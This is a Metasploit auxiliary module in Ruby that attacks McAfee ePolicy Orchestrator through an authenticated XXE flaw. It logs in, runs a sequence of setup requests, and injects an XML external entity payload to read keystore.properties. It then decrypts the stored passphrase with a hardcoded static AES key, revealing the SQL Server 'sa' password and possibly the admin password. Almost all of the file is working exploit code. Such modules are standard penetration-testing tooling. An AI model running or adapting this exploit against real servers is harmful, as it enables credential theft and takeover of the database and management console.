# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;openssl&#039;

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;McAfee ePolicy Orchestrator Authenticated XXE Credentials Exposure&#039;,
      &#039;Description&#039;    => %q{
      This module will exploit an authenticated XXE vulnerability to read the keystore.properties
      off of the filesystem. This properties file contains an encrypted password that is set during
      installation. What is interesting about this password is that it is set as the same password
      as the database &#039;sa&#039; user and of the admin user created during installation. This password
      is encrypted with a static key, and is encrypted using a weak cipher at that (ECB). By default,
      if installed with a local SQL Server instance, the SQL server is listening on all interfaces.

      Recovering this password allows an attacker to potentially authenticate as the &#039;sa&#039; SQL Server
      user in order to achieve remote command execution with permissions of the database process. If
      the administrator has no changed the password for the initially created account since installation,
      the attacker also now has the password for this account. By default, &#039;admin&#039; is recommended.

      Any user account can be used to exploit this, all that is needed is a pair of credentials.

      The most data that can be successfully retrieved is 255 characters due to length restrictions
      on the field used to perform the XXE attack.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Brandon Perry <bperry.volatile[at]gmail.com>&#039;, #metasploit module
        ],
      &#039;References&#039;     =>
        [
        ],
      &#039;DisclosureDate&#039; => &#039;&#039;
    ))

    register_options(
      [
        Opt::RPORT(8443),
        OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, true]),
        OptString.new(&#039;TARGETURI&#039;, [ true, "Base ePO directory path", &#039;/&#039;]),
        OptString.new(&#039;FILEPATH&#039;, [true, "The filepath to read on the server", "C:/Program Files (x86)/McAfee/ePolicy Orchestrator/Server/conf/orion/keystore.properties"]),
        OptString.new(&#039;USERNAME&#039;, [true, "The username to authenticate with", "username"]),
        OptString.new(&#039;PASSWORD&#039;, [true, "The password to authenticate with", "password"])
      ], self.class)

  end

  def run
    key = "\x5E\x9C\x3E\xDF\xE6\x25\x84\x36\x66\x21\x93\x80\x31\x5A\x29\x33" #static key used

    aes = OpenSSL::Cipher::Cipher.new(&#039;AES-128-ECB&#039;) # ecb, bad bad tsk
    aes.decrypt
    aes.padding=1
    aes.key = key

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;core&#039;, &#039;orionSplashScreen.do&#039;)
    })

    cookie = res.get_cookies

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;core&#039;, &#039;j_security_check&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_post&#039; => {
        &#039;j_username&#039; => datastore[&#039;USERNAME&#039;],
        &#039;j_password&#039; => datastore[&#039;PASSWORD&#039;]
      },
      &#039;cookie&#039; => cookie
    })

    cookie = res.get_cookies

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;core&#039;, &#039;orionSplashScreen.do&#039;),
      &#039;cookie&#039; => cookie
    })

    if res.code != 302
      fail_with(Failure::Unknown, &#039;Authentication failed&#039;)
    end

    cookie = res.get_cookies

    #This vuln requires a bit of setup before we can exploit it

    print_status("Setting up some things...")

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;core&#039;, &#039;orionNavigationLogin.do&#039;),
      &#039;cookie&#039; => cookie
    })

    auth_token = $1 if res.body =~ /id="orion.user.security.token" value="(.*)"\/>/

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;core&#039;, &#039;orionTab.do&#039;),
      &#039;vars_get&#039; => {
        &#039;sectionId&#039; => &#039;orion.automation&#039;,
        &#039;tabId&#039; => &#039;orion.tasklog&#039;,
        &#039;orion.user.security.token&#039; => auth_token
      },
      &#039;cookie&#039; => cookie
    })

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;core&#039;, &#039;loadTableData.do&#039;),
      &#039;vars_get&#039; => {
        &#039;datasourceAttr&#039; => &#039;scheduler.tasklog.datasource.attr&#039;,
        &#039;filter&#039; => &#039;scheduler.tasklog.filter.day&#039;,
        &#039;secondaryFilter&#039; => &#039;&#039;,
        &#039;tableCellRendererAttr&#039; => &#039;taskLogCellRenderer&#039;,
        &#039;count&#039; => 44,
        &#039;sortProperty&#039; => &#039;OrionTaskLogTask.StartDate&#039;,
        &#039;sortOrder&#039; => 1,
        &#039;id&#039; => &#039;taskLogTable&#039;
      },
      &#039;cookie&#039; => cookie
    })

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;core&#039;, &#039;orionEditTableFilter.do&#039;),
      &#039;vars_get&#039; => {
        &#039;datasourceAttr&#039; => &#039;scheduler.tasklog.datasource.attr&#039;,
        &#039;tableId&#039; => &#039;taskLogTable&#039;,
        &#039;orion.user.security.token&#039; => auth_token
      },
      &#039;cookie&#039; => cookie
    })

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;core&#039;, &#039;orionTableUpdateState.do&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_post&#039; => {
        &#039;dataSourceAttr&#039; => &#039;scheduler.tasklog.datasource.attr&#039;,
        &#039;tableId&#039; => &#039;taskLogTable&#039;,
        &#039;columnWidths&#039; => &#039;285,285,285,285,285,285,285,285&#039;,
        &#039;sortColumn&#039; => &#039;OrionTaskLogTask.StartDate&#039;,
        &#039;sortOrder&#039; => &#039;1&#039;,
        &#039;showFilters&#039; => &#039;true&#039;,
        &#039;currentIndex&#039; => 0,
        &#039;orion.user.security.token&#039; => auth_token,
        &#039;ajaxMode&#039; => &#039;standard&#039;
      },
      &#039;cookie&#039; => cookie
    })

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;core&#039;, &#039;loadDisplayType.do&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_post&#039; => {
        &#039;displayType&#039; => &#039;text_lookup&#039;,
        &#039;operator&#039; => &#039;eq&#039;,
        &#039;propKey&#039; => &#039;OrionTaskLogTask.Name&#039;,
        &#039;instanceId&#039; => 0,
        &#039;orion.user.security.token&#039; => auth_token,
        &#039;ajaxMode&#039; => &#039;standard&#039;
      },
      &#039;cookie&#039; => cookie
    })

    print_status("Sending payload...")

    xxe = &#039;<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///&#039;+datastore[&#039;FILEPATH&#039;]+&#039;" >]><conditions><condition grouping="or"><prop-key>OrionTaskLogTaskMessage.Message</prop-key><op-key>eq</op-key><value>&xxe;</value></condition></conditions>&#039;

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;core&#039;, &#039;orionUpdateTableFilter.do&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_post&#039; => {
        &#039;orion.user.security.token&#039; => auth_token,
        &#039;datasourceAttr&#039; => &#039;scheduler.tasklog.datasource.attr&#039;,
        &#039;tableId&#039; => &#039;taskLogTable&#039;,
        &#039;conditionXML&#039; => xxe,
        &#039;secondaryFilter&#039; => &#039;&#039;,
        &#039;op&#039; => &#039;eq&#039;,
        &#039;ajaxMode&#039; => &#039;standard&#039;
      },
      &#039;cookie&#039; => cookie
    })

    print_status("Getting encrypted passphrase value from keystore.properties file...")

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;core&#039;, &#039;orionEditTableFilter.do&#039;),
      &#039;vars_get&#039; => {
        &#039;datasourceAttr&#039; => &#039;scheduler.tasklog.datasource.attr&#039;,
        &#039;tableId&#039; => &#039;taskLogTable&#039;,
        &#039;orion.user.security.token&#039; => auth_token
      },
      &#039;cookie&#039; => cookie
    })

    passphrase = $1 if res.body =~ /passphrase=(.*?)\\u003/

    passphrase = passphrase.gsub(&#039;\\\\=&#039;, &#039;=&#039;).gsub("\\u002f", "/").gsub("\\u002b", "+")

    print_status("Base64 encoded encrypted passphrase: " + passphrase)

    passphrase = aes.update(Rex::Text.decode_base64(passphrase)) + aes.final

    print_good("The decrypted password for the keystore, &#039;sa&#039; SQL user (if using local instance), and possibly &#039;admin&#039; is: " + passphrase)

  end
end

